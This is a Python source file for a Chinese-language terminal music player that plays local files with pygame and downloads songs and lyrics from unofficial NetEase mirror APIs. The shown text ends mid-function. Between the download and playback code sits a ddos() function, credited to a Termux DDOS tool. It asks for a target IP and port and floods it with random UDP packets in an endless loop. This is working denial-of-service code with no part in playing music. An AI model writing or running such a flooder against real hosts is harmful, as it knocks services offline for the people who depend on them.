#!/bin/env python3

import subprocess
from pathlib import Path
import sys,os

Author_name="NULL"
print_sleep = 0.02 # Logo打印速度
MUSIC_DIR = Path("/storage/emulated/0/Music")  # 改成你的实际路径
"""
MUSIC_DIR = Path("C:/Users/seewo/Music") # 希沃一体机炸弹电脑
MUSIC_DIR = Path("C:/Users/administrator/Music") # 普通用户电脑
"""

# 这个是生成配置文件的，不用管
GUI_CONF_DEFAULTS = {
    "FONT_TITLE": "fonts/NotoSerifCJK-Bold.ttc",
    "FONT_NORM": "fonts/NotoSerifCJK-Bold.ttc",
    "FONT_SMALL": "fonts/NotoSerifCJK-Bold.ttc",
    "F_TITLE_SIZE": "26",
    "F_NORM_SIZE": "19",
    "F_SMALL_SIZE": "14",
    "C_BG": "18,16,28",
    "C_PANEL": "30,27,45",
    "C_PANEL2": "38,34,56",
    "C_ACCENT": "0,230,170",
    "C_ACCENT2": "120,90,255",
    "C_TEXT": "228,226,240",
    "C_DIM": "130,126,150",
    "C_BTN": "48,42,72",
    "C_BTN_HOV": "70,60,105",
    "C_BAR_BG": "45,40,65",
    "C_BAR_FILL": "0,230,170",
    "C_SEL": "60,48,110",
    "C_WHITE": "255,255,255",
    "C_DANGER": "200,70,90",
    "BAR_X": "60", "BAR_Y": "470", "BAR_W": "620", "BAR_H": "12",
    "VOL_X": "700", "VOL_Y": "500", "VOL_W": "140",
    "LIST_X": "60", "LIST_Y": "90", "LIST_W": "360", "LIST_H": "300",
    "LYRIC_X": "450", "LYRIC_Y": "60", "LYRIC_W": "390", "LYRIC_H": "340",
    "bg_image": "",
    "bg_dim": "120",
    "panel_alpha": "180",
    "window_title": "音乐播放器",
    "window_icon": "",
}

def _conf_path():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        name = os.path.splitext(os.path.basename(__file__))[0]
    except NameError:
        script_dir = os.getcwd()
        name = "config"
    return os.path.join(script_dir, f"{name}.conf")
    
def load_gui_conf():
    path = _conf_path()
    if not os.path.exists(path):
        try:
            with open(path, "w", encoding="utf-8") as f:
                for k, v in GUI_CONF_DEFAULTS.items():
                    f.write(f"{k}={v}\n")
        except Exception:
            pass
        return dict(GUI_CONF_DEFAULTS)
    conf = dict(GUI_CONF_DEFAULTS)
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip()
                if k in conf:
                    conf[k] = v
    except Exception:
        pass
    return conf

def _rgb(s):
    try:
        parts = [int(x) for x in s.split(",")]
        if len(parts) == 3:
            return tuple(parts)
    except Exception:
        pass
    return (0, 0, 0)

def _int(s, default=0):
    try:
        return int(s)
    except Exception:
        return default

GUI_CONF = load_gui_conf()

FONT_TITLE = GUI_CONF["FONT_TITLE"]
FONT_NORM  = GUI_CONF["FONT_NORM"]
FONT_SMALL = GUI_CONF["FONT_SMALL"]
F_TITLE_SIZE = _int(GUI_CONF["F_TITLE_SIZE"], 26)
F_NORM_SIZE  = _int(GUI_CONF["F_NORM_SIZE"], 19)
F_SMALL_SIZE = _int(GUI_CONF["F_SMALL_SIZE"], 14)

C_BG       = _rgb(GUI_CONF["C_BG"])
C_PANEL    = _rgb(GUI_CONF["C_PANEL"])
C_PANEL2   = _rgb(GUI_CONF["C_PANEL2"])
C_ACCENT   = _rgb(GUI_CONF["C_ACCENT"])
C_ACCENT2  = _rgb(GUI_CONF["C_ACCENT2"])
C_TEXT     = _rgb(GUI_CONF["C_TEXT"])
C_DIM      = _rgb(GUI_CONF["C_DIM"])
C_BTN      = _rgb(GUI_CONF["C_BTN"])
C_BTN_HOV  = _rgb(GUI_CONF["C_BTN_HOV"])
C_BAR_BG   = _rgb(GUI_CONF["C_BAR_BG"])
C_BAR_FILL = _rgb(GUI_CONF["C_BAR_FILL"])
C_SEL      = _rgb(GUI_CONF["C_SEL"])
C_WHITE    = _rgb(GUI_CONF["C_WHITE"])
C_DANGER   = _rgb(GUI_CONF["C_DANGER"])

BAR_X = _int(GUI_CONF["BAR_X"], 60)
BAR_Y = _int(GUI_CONF["BAR_Y"], 470)
BAR_W = _int(GUI_CONF["BAR_W"], 620)
BAR_H = _int(GUI_CONF["BAR_H"], 12)
VOL_X = _int(GUI_CONF["VOL_X"], 700)
VOL_Y = _int(GUI_CONF["VOL_Y"], 500)
VOL_W = _int(GUI_CONF["VOL_W"], 140)
LIST_X = _int(GUI_CONF["LIST_X"], 60)
LIST_Y = _int(GUI_CONF["LIST_Y"], 90)
LIST_W = _int(GUI_CONF["LIST_W"], 360)
LIST_H = _int(GUI_CONF["LIST_H"], 300)
LYRIC_X = _int(GUI_CONF["LYRIC_X"], 450)
LYRIC_Y = _int(GUI_CONF["LYRIC_Y"], 60)
LYRIC_W = _int(GUI_CONF["LYRIC_W"], 390)
LYRIC_H = _int(GUI_CONF["LYRIC_H"], 340)

BG_IMAGE_PATH = GUI_CONF["bg_image"]
BG_DIM = _int(GUI_CONF["bg_dim"], 120)
PANEL_ALPHA = _int(GUI_CONF["panel_alpha"], 180)
WINDOW_TITLE = GUI_CONF["window_title"]
WINDOW_ICON = GUI_CONF["window_icon"]

# 读取配置结束，下面不是配置的

SUPPORTED = (".mp3", ".wav", ".ogg", ".flac")
VOLUME_STEP = 0.1
REQUIRED_PACKAGES = {
    "requests": "requests",
    "tqdm": "tqdm",
    "curses": "curses",
    "shutil": "shutil",
    "pygame": "pygame",
    "mutagen": "mutagen",
}
missing = []
for pkg_name, import_name in REQUIRED_PACKAGES.items():
    try:
        __import__(import_name)
    except ModuleNotFoundError:
        missing.append(pkg_name)

if missing:
    print(f"\033[33mWARN: 检测到缺失的库: {', '.join(missing)}，正在安装...\033[0m")
    subprocess.run(
        [sys.executable, "-m", "pip", "install", *missing],
        check=True
    )
    import os
    os.execv(sys.executable, [sys.executable] + sys.argv)
def scan_music(directory: Path):
    """扫描目录下所有支持的音频文件"""
    if not directory.exists() or not directory.is_dir():
        return []
    files = []
    try:
        for ext in SUPPORTED:
            files.extend(directory.glob(f"*{ext}"))
          #  files.extend(directory.glob(f"*{ext.upper()}"))
    except PermissionError:
        pass
    return sorted(files, key=lambda p: p.name.lower())


def init_audio():
    """初始化音频——如果安卓，强制 pulseaudio"""
    if "ANDROID_ROOT" in os.environ or "PREFIX" in os.environ:
        os.environ["SDL_AUDIODRIVER"] = "pulseaudio"
    pygame.mixer.quit()
    pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=1024)
    pygame.mixer.music.set_volume(0.7)
    return True

import requests
import urllib.parse
import curses,shutil
import re
import time
from tqdm import tqdm
import pygame
from datetime import datetime
from mutagen import File
import bisect

def current_lyric(lrc_time, lrc_text, current_sec):
    if not lrc_time:
        return  "",-1
    idx = bisect.bisect_right(lrc_time, current_sec) - 1
    if idx < 0:
        return "",-1
    return lrc_text[idx],idx
    
    
def getmusic(_file):
     audio = File(_file)
     if audio is not None:
        duration = audio.info.length
        return f"{duration:.3f}"

def getime():
    now = datetime.now()
    return int(now.timestamp() * 1000)
def download_file(url, filename):
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    basename = os.path.basename(filename)
    with open(filename, 'wb') as file, \
         tqdm(total=total_size, unit='B', unit_scale=True, desc=basename) as bar:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                bar.update(len(chunk))
def str_ellipsis(text,terminal_width):
    threshold = terminal_width - 13
    if len(text) <= threshold:
        return text
    return text[:threshold - 13] + "..."
####请勿动此变量#####
progress = 0 ; end_time = ""; now_time = "" ; selected = 0 ; down = 0 ; tmp_list_num = 0 ; cursor = 0; tmp_cursor = 0; tmp_list_cursor = 0; old_vol = 0 ; music_data = ""; download_url = ""; vol_bar = ""; music_url = ""; file_name = ""; music_id = [] ; lrc_text = [] ; lrc_time = []
quality = ["hires", "lossless", "exhigh", "higher", "standard"]; USER_CHOICES = 0 ; USD_MOD = True ; GUI_MODE = False
def get_music(get_type,text,limit):
      songs = None
      get_headres = {
        "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/126.0.0.0 Safari/537.36"
        ),
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
      }
      murl = urllib.parse.quote(text)
      baseURI = "https://node.api.xfabe.com/api/wangyi/"
      getURI = "https://node.api.xfabe.com/api/wangyi/music?type=json&id="
      if get_type == "musicChart":
         url = baseURI + f"musicChart?list={limit}"
      elif get_type == "search":
         url = f"{baseURI}search?search={murl}&limit={limit}"
      elif get_type == "lyrics":
         url = f"{baseURI}lyrics?id={text}"
      print("\r\033[K正在向服务器发送请求，请稍等...")
      try: 
          response = requests.get(url=url,headers=get_headres,timeout=10)
          data = response.json()
          if get_type == "lyrics": return data["data"]["lyric"]
          songs = data["data"]["songs"];Pattern = "网络搜索"
      except TypeError:
         print("\033[31m解析函数出错，错误原因")
         print("\033[34m请求返回值异常: ")
         print(f"\033[32mSOURCE: \033[33m{response.text}\n")
         input("\033[35m按回车键退出....\033[0m")
         return 1;
      name = [];artistsname = [];album = [];music_time = []
      global music_id
      for song in songs:
        sec = song["duration"] // 1000
        minutes = sec // 60
        seconds = sec % 60
        duration_str = f"{minutes:02d}:{seconds:02d}"
        name.append(song['name'])
        artistsname.append(song['artistsname'])
        album.append(song['album'])
        music_time.append(duration_str)
        music_id.append(song['id'])
      if GUI_MODE:
        return name, artistsname, album, music_time, music_id
      def main(stdscr):
        curses.start_color()
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_WHITE)
        curses.init_pair(2, curses.COLOR_MAGENTA, -1)
        curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION)
        curses.curs_set(0)
        stdscr.nodelay(False)
        stdscr.keypad(True)
        global selected; tmp_selected = 0 ; global music_url ; global tmp_list_num ; down = 0 ; global music_data ; global download_url ; global file_name
        total = len(name)
        file_name = ""
        while True:
          stdscr.erase()
          max_y, max_x = stdscr.getmaxyx()
          available_lines = max_y - 5
          if total < max_y: fill = available_lines - total
          else: fill = 0
          if selected > tmp_selected and down ==  (available_lines-1):
            tmp_list_num+=1
          elif selected < tmp_selected and down == 0:
            tmp_list_num-=1
          if tmp_list_num+available_lines > total: tmp_list_num=0
          for line in range(available_lines):
            idx = line + tmp_list_num
            if idx >= total: break
            if idx == selected:
                stdscr.addstr(line+fill, 0, str_ellipsis(f"▌ {name[idx]} - {artistsname[idx]}",max_x), curses.color_pair(1) | curses.A_BOLD)
                down = line
            else:
                stdscr.addstr(line+fill, 0, str_ellipsis(f"▌ {name[idx]} - {artistsname[idx]}",max_x), curses.COLOR_WHITE)
          tmp_selected = selected
          stdscr.addstr(available_lines, 0, f"{selected+1}/{total}  {(available_lines+tmp_list_num)*100/total if total > available_lines else 100}%", curses.color_pair(2))
          stdscr.addstr(available_lines+1, 0, '─'*int(max_x), curses.A_DIM)
          stdscr.addstr(available_lines+2, 0,f"歌曲时间: {music_time[selected]}")
          stdscr.addstr(available_lines+3, 0,f"作者: {album[selected]}")
          stdscr.addstr(available_lines+4, 0,f"模式: {Pattern}")
          stdscr.refresh()
          key = stdscr.getch()
          curses.flushinp()
          if key == curses.KEY_MOUSE:
            _, x, y, _, bstate = curses.getmouse()
            if bstate & curses.BUTTON4_PRESSED and available_lines < len(name) and tmp_list_num > 0: tmp_list_num -= 1
            elif bstate & curses.BUTTON5_PRESSED and available_lines < len(name) and tmp_list_num+available_lines < len(name): tmp_list_num += 1
            elif bstate & curses.BUTTON1_CLICKED:
             if 1 <= y <= max_y and 0 < x < max_x:
               y=y-2
               if selected == y:
                file_name = f"{MUSIC_DIR}/{name[selected]} - {artistsname[selected]}"
                music_url = f"{getURI}{music_id[selected]}"
                break
               if 0 <= y < available_lines and y <= len(name) - 1:
                  selected = y + tmp_list_num
          elif key == ord('\n'):
            file_name = f"{MUSIC_DIR}/{name[selected]} - {artistsname[selected]}"
            music_url = f"{getURI}{music_id[selected]}"
            break
          elif key == ord('q'): return 0
          elif key == ord('j') or key == curses.KEY_DOWN:
            if tmp_list_num > selected: tmp_list_num=selected
            selected = min(selected + 1, total - 1)
          elif key == ord('k') or key == curses.KEY_UP:
            if selected >= tmp_list_num + available_lines: tmp_list_num = selected - available_lines + 1
            selected = max(selected - 1, 0)
      while True:
       curses.wrapper(main)
       if file_name == "": break
       print("\033[1;32mo\033[37m(\033[31m〃\033[34m'\033[33m▽\033[34m'\033[31m〃\033[37m)\033[32mo \033[36m正在加载歌曲，请稍等...")
       try:
           if USD_MOD:
             response = requests.get(url=music_url,headers=get_headres,timeout=10)
             music_data = response.json()
             download_url = music_data['data']['url']
           if not USD_MOD or download_url is None:
             print("\033[31m返回值为空，调用第2层请求链接")
             print("\033[32m在这里，你可以选择歌曲的架设:")
             print("\033[33m1. 标准音质")
             print("\033[34m2. 中等音质")
             print("\033[35m3. 提高音质")
             print("\033[36m4. 无损音质")
             print("\033[91m5. 高清音质")
             while True:
               tmp = input("\033[92m输入> \033[0mm")
               if not tmp:
                 USER_CHOICES = 0
                 break
               try: tmp = int(tmp)
               except:
                 print("\033[31mERROR: 输入类型错误")
                 print("\033[36m需要输入数字，请重新输入")
                 print("\033[33m留空选默认 \033[32m=> \033[34m1\033[0m")
                 continue
               if 1 <= tmp and tmp <= len(quality) - 1:
                 USER_CHOICES=tmp - 1
                 break
               else: print("\033[31m输入范围错误\033[0m")
             print("\033[32m重新发送get的请求\033[0m")
             response = requests.get(url=f"https://api.byfuns.top/1/?id={music_id[selected]}&level={quality[USER_CHOICES]}",headers=get_headres,timeout=10)
             if not response:
                print("\033[33mWARN: 返回值为空\033[0m")
                False
             else:
                download_url = response
       except:
           print("\033[0;31mERROR: 请求错误")
           print(f"\033[35m请求ID: \033[34m{music_id[selected]}")
           print(f"\033[36mHTTP请求返回值 => \033[33m{response.text}")
           input("\033[32m按回车键关闭...\033[0m")
           continue
       if USD_MOD: 
          print(f"\033[1;32m▶ 用户选择: \033[33m{file_name}\n\033[34m返回码: \033[32m{music_data['code']} \n\033[36m状态: \033[35m{music_data['msg']}\n\033[33m类型: \033[32m{music_data['data']['pay']}\n\033[31m下载链接: \033[34m{download_url}\033[0m")
          music_lrc = get_music("lyrics",music_data['data']['id'],limit)
       if download_url != "None":
         try:
          download_file(download_url,f"{file_name}.mp3")
         except:
          input("\033[31m下载失败，按回车键关闭...\033[0m")
          continue
         if music_lrc != "": 
           with open(f"{file_name}.lrc", "w", encoding="utf-8") as f: f.write(music_lrc)
         print("\033[32mDone: 下载已完成...\033[0m")
       else:
         if music_data['data']['pay'] == "免费音乐":
          print("\033[33m正在启动2号下载链接...\033[0m")
          try:
            download_file(f"https://music.163.com/song/media/outer/url?id={music_id[selected]}",f"{file_name}.mp3")
          except:
            input("\033[31m下载失败，按回车键关闭...\033[0m")
            continue
          if music_lrc != "": 
           with open(f"{file_name}.lrc", "w", encoding="utf-8") as f: f.write(music_lrc)
          print("\033[32m下载已完成...\033[0m")
         else:
          print("\033[33m未获取下载链接\033[0m")
       temp = input("\033[34m😂 还要不要继续下载?\033[32m[y/n]\033[33m ❯ \033[0m")
       if temp == "n" or temp == "NO" or temp == "N" or temp == "q": break
def ddos():
       import socket,random
       from datetime import datetime
       now = datetime.now()
       hour = now.hour;minute = now.minute;day = now.day;month = now.month;year = now.year;sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);bytes = random._urandom(1490)
       print("[H[2J[3J[1;31mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM[0m\n[1;31mM       YMM M       YMM MMP     YMM MP       MM[0m\n[1;31mM  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M[0m\n[1;31mM  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM[0m\n[1;31mM  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M[0m\n[1;31mM  MMMM   M M  MMMM   M M   MMM   M M   MMM   M[0m\n[1;31mM        MM M        MM MMb     dMM Mb       dM[0m\n[1;31mMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM[0m\n[1;41;97m  Distributed Denial of Service - Termux Tools [0m\n\n[1;33mAuthor   : [1;97mPembriAhmad[0m\n[1;33mGithub   : [1;97mhttps://github.com/pembriahmad[0m\n[1;33mSource   : [1;97mhttps://github.com/pembriahmad/DDOS[0m\n\n[1;32mPress CTRL+C to stop sending[0m\n[1;97m\n------------\nINPUT TARGET\n------------[0m")
       ip = input("[0;97m[*][1;31m IP or HOSTNAME : [1;32m");port = input("[0;97m[*][1;31m PORT SCANNING  : [1;32m");sd = input("[0;97m[*][1;31m ATTACK SPEED [1~1000]  : [1;32m");sent = 0
       while True:
          sock.sendto(bytes, (ip,int(port)))
          sent = sent + 1
          print ("[1;32mSent %s packet to %s throught port: %d [0m"%(int(sent),ip,int(port)))
          time.sleep((1000-int(sd))/2000)
def is_same_file(a: Path, b: Path):
    """安全比较两个文件是否相同，避免 samefile() 抛异常"""
    try:
        return a.resolve() == b.resolve()
    except Exception:
        return str(a) == str(b)
music_time = 0
start_time = 0
flag = 0
class Player:
    """封装 pygame.mixer 的播放控制"""
    def __init__(self):
        self._initialized = False
        self.volume = 0.5
        self.current_file: Path | None = None
        self.is_paused = False
        try:
            pygame.mixer.init()
            pygame.mixer.music.set_volume(self.volume)
            self._initialized = True
        except Exception:
            pass

    @property
    def ready(self):
        return self._initialized

    def play(self, filepath: Path):
        """播放指定文件，失败时静默跳过"""
        if not self._initialized:
            return
        if not filepath.exists():
            return
        try: 
            pygame.mixer.music.load(str(filepath))
            pygame.mixer.music.play()
            self.current_file = filepath
            global flag
            flag = 0
            self.is_paused = False
            global music_time
            global start_time
            global lrc_text
            global lrc_time
            start_time = getime()
            music_time = getmusic(str(filepath))
            lrc_time, lrc_text = local_lrc(os.path.splitext(filepath)[0] + ".lrc")
        except Exception:
            self.current_file = None
            self.is_paused = False

    def toggle_pause(self):
        if not self._initialized:
            return
        try:
            if not self.is_paused and pygame.mixer.music.get_busy():
                pygame.mixer.music.pause()
                self.is_paused = True
            elif self.is_paused:
                pygame.mixer.music.unpause()
                self.is_paused = False
        except Exception:
            pass

    def stop(self):
        if not self._initialized:
            return
        try:
            flag = 0
            pygame.mixer.music.stop()
        except Exception:
            pass
        self.is_paused = False
        self.current_file = None

    def volume_up(self):
        if not self._initialized:
            return
        self.volume = min(1.0, self.volume + VOLUME_STEP)
        try:
            pygame.mixer.music.set_volume(self.volume)
        except Exception:
            pass

    def volume_down(self):
        if not self._initialized:
            return
        self.volume = max(0.0, self.volume - VOLUME_STEP)
        try:
            pygame.mixer.music.set_volume(self.volume)
        except Exception:
            pass

    def is_busy(self):
        if not self._initialized:
            return False
        try:
            return pygame.mixer.music.get_busy()
        except Exception:
            return False

    def quit(self):
        if self._initialized:
            try:
                pygame.mixer.music.stop()
                pygame.mixer.quit()
            except Exception:
                pass
          
    def Jump(self, pos):
      if not pygame.mixer.music.get_busy():
          return False
      global flag
      current = pygame.mixer.music.get_pos() / 1000.0 + flag
      target = current + float(pos)
      int_music_time = float(music_time)
      if int_music_time > 0:
        target = max(0, min(target, int_music_time))
      pygame.mixer.music.rewind()
      pygame.mixer.music.set_pos(target)
      pos_ms = pygame.mixer.music.get_pos()
      flag = target - pos_ms / 1000.0 if pos_ms >= 0 else target
      return True

          
    def progress(self):
        if pygame.mixer.music.get_busy():
            if float(music_time) <= 0: return 0.0
            pos_ms = pygame.mixer.music.get_pos()
            if pos_ms >= 0:
               return (pos_ms/1000+flag)/float(music_time)*100
               
    def get_play_progress(self):
        now_ms=pygame.mixer.music.get_pos()
        end_ms=int(float(music_time) * 1000)
        def fmt(ms):
            total_sec=int(ms)//1000
            m,s=divmod(total_sec, 60)
            h,m=divmod(m, 60)
            if h:
               return f"{h:02d}:{m:02d}:{s:02d}"
            return f"{m:02d}:{s:02d}"
        return fmt(now_ms + flag * 1000), fmt(end_ms)

def local_lrc(files):
    if not os.path.exists(files):
       print(f"ERROR: 歌词文件不存在: {files}")
       return None,None
    raw_bytes = None
    for enc in ['utf-8-sig', 'utf-8', 'gbk', 'gb2312', 'gb18030', 'latin-1']:
       try:
          with open(files, "rb") as f:
             raw_bytes = f.read()
          content = raw_bytes.decode(enc)
          break
       except (UnicodeDecodeError, UnicodeError):
          continue
    if raw_bytes is None:
        print(f"ERROR: 歌词无法解码文件: {files}")
        return None,None
    time = [] ; text = []
    for read_line in content.split('\n'):
       split_tmp = read_line.lstrip('[').split(']')
       if re.fullmatch(r"[0-9.]+:[0-9.]+", split_tmp[0]):
         line_read = split_tmp[0].split(':')
         if len(line_read) == 3: time.append(float(line_read[0])*3600+float(line_read[1])*60+float(line_read[0]))
         elif len(line_read) == 2: time.append(float(line_read[0])*60+float(line_read[1]))
         elif len(line_read) == 1: time.append(float(line_read[0]))
         else: print(f"\033[33mWARN: 无法理解时间戳 {split_tmp[0]}\033[0m")
       else:
         print(f"\033[33mWARN: 读取到错误时间戳 {split_tmp[0]}\033[0m")
       try:
         text.append(split_tmp[1])
       except IndexError:
         print("\033[33mWARN: 未读取到歌词\033[0m")
    return time,text
def player():
 def main(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(False)
    stdscr.keypad(True)
    stdscr.timeout(300)
    curses.noecho()
    curses.cbreak()
    curses.start_color()
    curses.use_default_colors()
    curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION)
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLUE)  # 选中行
    curses.init_pair(2, curses.COLOR_GREEN, -1)                 # 播放中标记
    curses.init_pair(3, curses.COLOR_CYAN, -1)                  # 标题
    curses.init_pair(4, curses.COLOR_YELLOW, -1)                # 状态栏
    curses.init_pair(5, curses.COLOR_RED, -1)                   # 错误提示
    player = Player()
    SELECTED   = curses.color_pair(1) | curses.A_BOLD
    PLAYING    = curses.color_pair(2) | curses.A_BOLD
    TITLE      = curses.color_pair(3) | curses.A_BOLD
    STATUSBAR  = curses.color_pair(4)
    ERROR      = curses.color_pair(5) | curses.A_BOLD
    files = scan_music(MUSIC_DIR)
    if not files:
        stdscr.addstr(2, 2, f"没找到音乐文件: {MUSIC_DIR}",ERROR)
        time.sleep(1)
        return
    global down;global cursor;global tmp_cursor;global tmp_list_cursor;global old_vol;global vol_bar;total = len(files);need_redraw = True;progress_old = 0;last_redraw_time = 0;REDRAW_INTERVAL = 0.3;progress_old = -1
    try:
        if vol_bar == "": init_audio()
        else: True
    except Exception as e:
        stdscr.clear()
        stdscr.addstr(1, 2, f"音频初始化失败: {e}",ERROR)
        time.sleep(1)
        stdscr.getch()
        return
    max_y, max_x = stdscr.getmaxyx()
    underline =  "─" * (max_x - 2)
    progress_msg = "00:00/00:00 ["+" "*(max_x-20)+"] 0.0%"
    msg = "初始化完成"
    while True:
        max_y, max_x = stdscr.getmaxyx()
        available_lines = max_y - 7
        if need_redraw:
         stdscr.clear()
         if cursor > tmp_cursor and down ==  (available_lines-1):
           tmp_list_cursor+=1
         elif cursor < tmp_cursor and down == 0:
           tmp_list_cursor-=1
         if tmp_list_cursor+available_lines > total: tmp_list_cursor=0
         stdscr.addstr(0,(max_x-14)//2,"终端音乐播放器", TITLE)
         stdscr.addstr(1, 1, underline)
         
         for line in range(available_lines):
           idx = line + tmp_list_cursor
           if idx >= total: break
           if idx == cursor:
             prefix = "➜  "
             art_style = SELECTED
             down = line
           else:
              prefix = "   "
              art_style = curses.A_NORMAL
           if player.current_file and is_same_file(files[idx], player.current_file):
             if player.is_busy():
                 prefix = "♫  "
             elif player.is_paused:
                 prefix = "⏸  "

           stdscr.addstr(line+2, 0, str_ellipsis(f"{prefix}{files[idx].name}",max_x),art_style)
         stdscr.addstr(available_lines+2, 1, underline)
         if len(files)>available_lines: stdscr.addstr(available_lines+2, max_x-6, f"{(available_lines+tmp_list_cursor)*100/len(files)}%")
         else: stdscr.addstr(available_lines+2, max_x-6, "100%")
         if player.current_file and player.current_file.exists():
          if not lrc_time or not lrc_text: now_playing = f"正在播放: {player.current_file.name}"
          else: now_playing,_=current_lyric(lrc_time, lrc_text,pygame.mixer.music.get_pos()/1000+flag)
         elif player.current_file: now_playing = "⚠ 文件已不存在"
         else: now_playing = "就绪 - ↑↓ 选择 Enter 播放 空格 暂停 s 停止 n 下一首 p 上一首 +/- 音量 r 刷新 q 退出"
         stdscr.addstr(available_lines+3, 1, now_playing[:max_x - 4], STATUSBAR)
         vol = player.volume
         if vol != old_vol: 
            vol_bar = '█'*int(vol*(max_x-45))+'░'*((max_x-45)-int(vol*(max_x-45)))
            old_vol = vol
         stdscr.addstr(available_lines+4, 0, f" 音量: [{vol_bar}] {int(vol * 100)}%  共有{len(files)}首歌曲  {msg}")
         stdscr.addstr(available_lines+5, 0, f" {progress_msg}")
         tmp_cursor = cursor
         need_redraw = False
        
        key = stdscr.getch()
        curses.flushinp()
        underline="─"*(max_x - 2)
        if player.is_busy():
           global end_time
           global now_time
           global progress
           progress=player.progress()
           now_time,end_time=player.get_play_progress()
           bar_wide=max_x-len(f"{now_time}/{end_time}")-len(f"{progress:.1f}%")-5
           filled = int(bar_wide*(progress/100))
           progress_bar = "=" * filled + ">" + " " * (bar_wide - filled - 1)
           progress_msg = f"{now_time}/{end_time} [{progress_bar}] {progress:.1f}%"
           t_now = time.time()
           if progress != progress_old and t_now - last_redraw_time > REDRAW_INTERVAL:
             need_redraw = True
             progress_old = progress
             last_redraw_time = t_now
           else:
             need_redraw = False
        elif player.is_paused:
           msg = "⏸ 暂停播放"

        
        if key == curses.KEY_MOUSE:
            _, x, y, _, bstate = curses.getmouse()
            if bstate & curses.BUTTON4_PRESSED and available_lines < len(files) and tmp_list_cursor > 0: tmp_list_cursor -= 1
            elif bstate & curses.BUTTON5_PRESSED and available_lines < len(files) and tmp_list_cursor+available_lines < len(files): tmp_list_cursor += 1
            elif bstate & curses.BUTTON1_CLICKED:
             if 2 <= y <= max_y - 5 and 0 < x < max_x:
               y=y-2
               if cursor == y: player.play(files[cursor])
               if 0 <= y <= available_lines and y <= len(files) - 1:
                  cursor = y + tmp_list_cursor
               msg="使用鼠标选歌"
             elif available_lines < y < max_y and 2 < x < max_x:
                if max_y - 3 < y and len(f"{now_time}/{end_time}") + 2 < x < max_x - len(f"{progress:.1f}%["):
                       bar_start = len(f"{now_time}/{end_time}") + 2
                       bar_end = max_x - len(f"{progress:.1f}%[")
                       player.Jump(f"{(x - bar_start) / (bar_end - bar_start) * float(music_time) - (pygame.mixer.music.get_pos()/1000 + flag):+.1f}")
                elif y == available_lines + 4 and len(" 音量: [") <= x <= len(" 音量: [") + (max_x - 45):
                       player.volume = (x - len(" 音量: [")) / (max_x - 45)
                       try:
                         pygame.mixer.music.set_volume(player.volume)
                       except Exception:
                         pass
             else:
               msg=f"未知坐标 {x}:{y}"
            elif bstate & curses.BUTTON3_CLICKED: msg="抱歉，暂不支持右键操作"
            need_redraw = True
        elif key in (ord("q"), ord("Q")):
            break
        elif key == curses.KEY_UP and cursor > 0:
            cursor -= 1
            if cursor >= tmp_list_cursor + available_lines: tmp_list_cursor = cursor - available_lines + 1
            need_redraw = True
        elif key == curses.KEY_DOWN and cursor < len(files) - 1:
            cursor += 1
            if tmp_list_cursor > cursor: tmp_list_cursor=cursor
            need_redraw = True
        elif key == curses.KEY_LEFT:
            player.Jump("-5")
            need_redraw = True
        elif key == curses.KEY_RIGHT:
            player.Jump("+5")
            need_redraw = True
        elif key in (ord("n"), ord("N")):
            if len(files) > 0:
                cursor = (cursor + 1) % len(files)
                player.play(files[cursor])
                need_redraw = True
                msg = "下一首"
        elif key in (ord("p"), ord("P")):
            if len(files) > 0:
                cursor = (cursor - 1) % len(files)
                player.play(files[cursor])
                need_redraw = True
                msg = "上一首"
        elif key in (ord("r"), ord("R"), ord("d"), ord("D")):
            if key in (ord("d"), ord("D")):
               stdscr.addstr(available_lines + 5, 1, f"是否要删除: {files[cursor]} (y/n)",ERROR)
               stdscr.refresh()
               while True:
                   temp = stdscr.getch()
                   if temp in (ord("y"), ord("Y")):
                     try:
                       os.remove(files[cursor])
                       os.remove(os.path.splitext(files[cursor])[0] + ".lrc")
                       msg = "已删除"
                     except FileNotFoundError:
                       msg = "删除文件时出现异常"
                     break
                   elif temp in (ord("n"), ord("N"), 27):
                       msg = "已取消"
                       break
            files = scan_music(MUSIC_DIR);tmp_list_cursor = 0;total = len(files)
            down = 0;idx = 0;cursor = 0
            need_redraw = True
            msg = "刷新文件"
        elif key in (ord("s"), ord("S")):
            player.stop()
            need_redraw = True
            msg = "停止音乐"
        elif key in (ord("+"), ord("=")):
            player.volume_up()
            need_redraw = True
            msg = "加大音量"
        elif key == ord("-"):
            player.volume_down()
            need_redraw = True
            msg = "减少音量"
        elif key in (curses.KEY_ENTER, 10, 13):
            player.play(files[cursor])
            need_redraw = True
            msg = "正在播放"
        elif key == ord(" "):
            player.toggle_pause()
            need_redraw = True
            msg = "暂停播放"
                
 curses.wrapper(main)
'''
 GUI - PYGAME
'''
def play_gui():
    print("\033[H\033[2J\033[3J")

    global GUI_MODE
    GUI_MODE = True

    def start(_): print(f"\033[1m[\033[35mSTART\033[0;1m]: \033[35m{_}\033[0m")
    def info(_):  print(f"\033[1m[\033[32mINFO\033[0;1m]: \033[32m{_}\033[0m")
    def warn(_):  print(f"\033[1m[\033[33mWARN\033[0;1m]: \033[33m{_}\033[0m")
    def err(_):   print(f"\033[1m[\033[31mERROR\033[0;1m]: \033[31m{_}\033[0m")

    def _hook(t, v, tb):
